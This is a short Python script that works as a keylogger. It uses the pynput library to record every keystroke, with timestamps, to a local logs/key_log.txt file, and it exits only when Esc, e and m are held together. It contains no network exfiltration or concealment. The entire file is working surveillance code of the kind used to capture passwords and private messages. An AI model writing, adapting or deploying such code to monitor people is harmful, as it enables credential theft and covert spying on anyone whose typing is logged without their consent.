import logging
import os
from pynput.keyboard import Listener
import keyboard


# create log file of pressed keys
def starting():
    if not os.path.exists(os.getcwd() + '/logs/'):
        os.mkdir('logs')

    log_directory = os.getcwd() + '/logs/'  # where to save the file
    logging.basicConfig(filename=(log_directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    # function in logging
    def on_press(key):
        logging.info(key)
        if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
            exit()

    with Listener(on_press=on_press) as listener:
        listener.join()  # infinite cycle

    return False
